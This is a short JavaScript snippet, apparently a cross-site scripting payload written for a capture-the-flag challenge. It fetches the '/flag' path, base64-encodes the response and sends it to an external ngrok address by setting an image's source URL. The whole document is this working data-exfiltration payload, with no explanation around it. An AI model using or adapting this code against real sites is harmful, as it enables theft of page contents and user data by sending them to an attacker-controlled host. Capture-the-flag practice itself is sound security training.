fetch('/flag')
.then(r=>r.text())
.then(d=>new Image().src='https://radiological-myriam-balancedly.ngrok-free.dev/?f='+btoa(d))
